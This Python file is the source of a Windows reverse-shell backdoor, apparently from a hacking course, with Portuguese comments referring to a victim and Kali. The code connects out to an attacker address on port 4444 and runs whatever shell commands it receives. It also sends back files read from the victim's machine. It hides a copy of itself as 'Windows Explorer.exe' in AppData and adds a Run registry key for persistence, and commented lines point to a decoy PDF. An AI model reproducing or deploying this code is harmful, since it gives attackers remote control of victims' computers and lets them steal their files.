#nc -vv -l -p 4444

import socket
import subprocess
import json
import os
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))


    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + evil_file_location + '"',shell=True)


    def execute_system_command(self,command):
        return subprocess.check_output(command,shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    
    def change_working_directory_to(self,path):
        os.chdir(path)
        return path
    
    def read_file(self,path):
        with open(path, 'rb') as file:
            return file.read()

    def run(self):
        while True:
            command = self.connection.recv(1024)
            data = json.loads(command)

            if data[0] == "exit":
                self.connection.close()
                sys.exit()
            elif data[0] == 'cd' and len(data[0]) > 1:
                command_result = self.change_working_directory_to(data[1].encode())
            elif data[0] == 'download':
                command_result = self.read_file(data[1])
            else:
                # Executa o comando que a vítima recebe de texto
                command_result = self.execute_system_command(data)
            
            # digitiar no kali "hello from kali" + enter
            # Envia o resultado do comando ;) executado na vítima
            self.connection.send(command_result)
        
            # message = "\n [+] connection establisheed \n"
            # connection.send(message.encode())
            # Receber msg = max 1024 chars
            # connection.close()

# file_name = sys._MEIPASS + "\document.pdf"
# subprocess.Popen(file_name,shell = True)

try: 
    my_backdoor = Backdoor("192.168.0.158", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
